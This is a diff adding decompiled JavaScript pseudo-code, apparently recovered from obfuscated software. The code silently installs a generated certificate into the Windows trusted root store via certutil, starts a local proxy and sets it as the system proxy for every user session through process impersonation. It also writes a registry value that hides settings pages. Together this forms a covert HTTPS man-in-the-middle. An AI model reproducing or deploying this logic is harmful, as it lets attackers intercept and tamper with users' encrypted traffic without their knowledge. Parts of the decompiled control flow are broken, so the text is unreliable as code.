@@ -1,0 +1,314 @@
+function func_startSslProxy_0x10000be32()
+{
+	r3 = <closure>
+	r4 = <this>
+	Scope[1139][3] = func_c_0x10000be30
+	ACCU = null
+	try
+	{
+		r5 = func_getOrRefreshCertificate_0x100000729()
+		r4 = await r5
+		r5 = _GeneratorGetResumeMode(Scope[1139])
+		if (!r5 === 0)
+		{
+			ACCU = r4
+		}
+		r0 = r4
+		r7 = r0["certificate"]["value"]
+		r5 = func_installCertificate_0x100000a3e(r7)
+		r4 = await r5
+		r5 = _GeneratorGetResumeMode(Scope[1139])
+		if (!r5 === 0)
+		{
+			ACCU = r4
+		}
+		r5 = func_createServer_0x100000719()
+		r4 = await r5
+		r5 = _GeneratorGetResumeMode(Scope[1139])
+		if (!r5 === 0)
+		{
+			ACCU = r4
+		}
+		Scope[1139][4] = r4
+		r4 = global_bB["listen"]
+		r5 = new {"server": null, "port": null}
+		r6 = global_bB["bridge"]
+		r5["server"] = r6(global_ll, func_pushError_0x100000142)
+		r5["port"] = Scope[1139][4]
+		r7 = global_EA["proxy"]["listen"]
+		r6 = r5
+		ACCU = _CopyDataProperties(r6, r7)
+		r5["ssl"] = r0
+		ACCU = r4(r5)
+		r4 = (func_workerPoolConstructor_0x100006759(func_withCreateProcessUser_0x10000b86b))["withEverySession"]
+		r5 = r4(func_setLocalProxy_0x10000be31)
+		r4 = await r5
+		r5 = _GeneratorGetResumeMode(Scope[1139])
+		if (!r5 === 0)
+		{
+			ACCU = r4
+		}
+		ACCU = func_createRegistrySettings_0x100000a43()
+		r5 = undefined
+		ACCU = r5
+		return r5
+	}
+	catch {}
+	r4 = ACCU
+	ACCU = null
+	ACCU = Scope[1140]
+	return Scope[1140][2]
+}
+function func_setLocalProxy_0x10000be31(a0)
+{
+	r2 = ("127.0.0.1:" + Scope[1139][4])
+	return func_setProxyLoop_0x100000a41(a0, r2)
+}
+function func_withCreateProcessUser_0x10000b86b(a0)
+{
+	r0 = global_ZT["withCreateProcessUser"]
+	return r0(a0, func_forkFullImpersonation_0x10000b86a)
+}
+function func_workerPoolConstructor_0x100006759(a0)
+{
+	r1 = <closure>
+	ACCU = <closure>
+	ACCU = r0
+	r6 = supper(r0)
+	ACCU = <this>
+	<this> = r6
+	ACCU = <this>
+	<this>["createWorker"] = a0
+	ACCU = <this>
+	<this>["pool"] = Map(r0)
+	ACCU = <this>
+	ACCU = <this>
+	r6 = <this>["rebuildWorkers"]["bind"]
+	ACCU = <this>
+	<this>["rebuildWorkers"] = r6(<this>)
+	ACCU = <this>
+	r7 = <this>["rebuildWorkers"]
+	ACCU = global_OV["on"]("sessions", r7)
+	return <this>
+}
+function func_createRegistrySettings_0x100000a43()
+{
+	r4 = global_jm["default"]["registryCreateKey"]
+	ACCU = r4(global_Km)
+	r4 = global_jm["default"]["registrySetValue"]
+	ACCU = r4(global_Km, "SettingsPageVisibility", global_qK)
+	return undefined
+}
+function func_installCertificate_0x100000a3e(a0)
+{
+	r6 = <closure>
+	r7 = <this>
+	ACCU = func_n_0x100000a3c
+	try
+	{
+		r1 = new {"V": 32940, "J": "nvO5", "S": 11571, "g": "A5nh", "L": 62024, "X": "O9*f", "j": 53954, "E": "BS4&", "c": 122897, "x": "VHeU", "K": 81147, "u": "JrBU", "A": 14982, "s": "h98j", "b": 56496, "i": "h^gm", "w": 30264, "f": "x&b0", "t": 78979, "P": "iSZ6", "I": 99578, "p": "toM2", "o": 71889}
+		r10 = r1["K"]
+		r8 = global_UK["tmpName"]()
+		r7 = await r8
+		r8 = _GeneratorGetResumeMode(Scope[10601])
+		if (!r8 === 0)
+		{
+			ACCU = r7
+		}
+		r3 = r7
+		ACCU = r3
+		try
+		{
+			r10 = (require("fs/promises"))["writeFile"]
+			r11 = r10(r3, a0)
+			r10 = await r11
+			r11 = _GeneratorGetResumeMode(Scope[10601])
+			if (!r11 === 0)
+			{
+				ACCU = r10
+			}
+			r13 = "certutil"
+			r15 = new [0, "-f", 0, 0]
+			r15[0] = "-addstore"
+			r15[2] = "root"
+			r15[3] = r3
+			r11 = r2
+			r11 = func_spawnChildProcess_0x100000706(r13, r15)
+			r10 = await r11
+			r11 = _GeneratorGetResumeMode(Scope[10601])
+			if (!r11 === 0)
+			{
+				ACCU = r10
+			}
+			ACCU = -1
+			r8 = -1
+			r7 = -1
+		}
+		catch
+		{
+			r8 = ACCU
+			r7 = 0
+		}
+		r11 = (require("fs/promises"))["rm"](r3)
+		r10 = await r11
+		r11 = _GeneratorGetResumeMode(Scope[10601])
+		if (!r11 === 0)
+		{
+			ACCU = r10
+		}
+		ACCU = null
+		if (r7 === 0)
+		{
+			ACCU = r8
+		}
+		r8 = undefined
+		ACCU = r8
+		return r8
+	}
+	catch {}
+	r7 = ACCU
+	ACCU = null
+	ACCU = Scope[10602]
+	return Scope[10602][2]
+}
+function func_getOrRefreshCertificate_0x100000729(a0)
+{
+	r7 = <closure>
+	r8 = <this>
+	r1 = ACCU
+	try
+	{
+		ACCU = a0
+		if (a0 == undefined)
+		{
+			ACCU = false
+		}
+		else
+		{
+			ACCU = a0
+		}
+		r0 = ACCU
+	}
+	catch
+	{
+		r8 = ACCU
+		ACCU = null
+		ACCU = Scope[10704]
+		r9 = r1
+		return Scope[10704][2]
+	}
+	ACCU = func_n_0x100000725
+	try
+	{
+		if (r0)
+		{
+			r6 = func_generateKeyPairAndCertificate_0x10000072c()
+			r9 = global_Lm["set"]
+			r10 = r9(r6)
+			r9 = r1
+			r9 = await r10
+			r10 = _GeneratorGetResumeMode(r1)
+			if (!r10 === 0)
+			{
+				ACCU = r9
+			}
+			r9 = r1
+			return r6
+		}
+		r9 = global_Lm["get"]
+		r10 = r9()
+		r9 = r1
+		r9 = await r10
+		r10 = _GeneratorGetResumeMode(r1)
+		if (!r10 === 0)
+		{
+			ACCU = r9
+		}
+		r4 = r9
+		if (!r4)
+		r12 = r4["certificate"]["value"]
+		ACCU = func_validateCertificate_0x100000724(r12)
+			|| (!func_validateCertificate_0x100000724(r12))
+		{
+			ACCU = func_getOrRefreshCertificate_0x100000729(true)
+		}
+		else
+		{
+			ACCU = r4
+		}
+		r10 = ACCU
+		r9 = r1
+		ACCU = r10
+		return r10
+	}
+	catch {}
+	r9 = ACCU
+	ACCU = null
+	ACCU = Scope[10706]
+	r10 = r1
+	return Scope[10706][2]
+}
+function func_createServer_0x100000719(a0)
+{
+	r3 = <closure>
+	r4 = <this>
+	ACCU = null
+	try
+	{
+		ACCU = a0
+		if (a0 == undefined)
+		{
+			ACCU = "127.0.0.1"
+		}
+		else
+		{
+			ACCU = a0
+		}
+		Scope[10710][2] = ACCU
+	}
+	catch
+	{
+		r4 = ACCU
+		ACCU = null
+		ACCU = Scope[10711]
+		return Scope[10711][2]
+	}
+	ACCU = func_x_0x100000707
+	Scope[10712][10] = func_x_0x100000707
+	try
+	{
+		Scope[10712][9] = (require("net"))["createServer"]()
+		ACCU = Promise
+		r6 = Promise(func_startServerAndListen_0x100000718)
+		ACCU = r6
+		return r6
+	}
+	catch {}
+	r5 = ACCU
+	ACCU = null
+	ACCU = Scope[10713]
+	return Scope[10713][2]
+}
+function func_pushError_0x100000142(a0, a1)
+{
+	r0 = new {"V": "b48I", "J": 97714, "S": "epz[", "g": 117612, "L": "epz[", "X": 95913, "j": "89J2", "E": 59689}
+	r5 = new {"KhfBD": null}
+	r5["KhfBD"] = func_instanceOf_0x100000141
+	r4 = r5["KhfBD"]
+	ACCU = r4(a0, Error)
+	if (r4(a0, Error))
+	{
+		ACCU = a0
+	}
+	else
+	{
+		ACCU = Error
+		ACCU = Error(r0)
+	}
+	r2 = ACCU
+	r4 = global_tP["api"]["pushError"]
+	r7 = new {"context": null}
+	r7["context"] = a1
+	ACCU = r4(r2, r7)
+	return undefined
+}
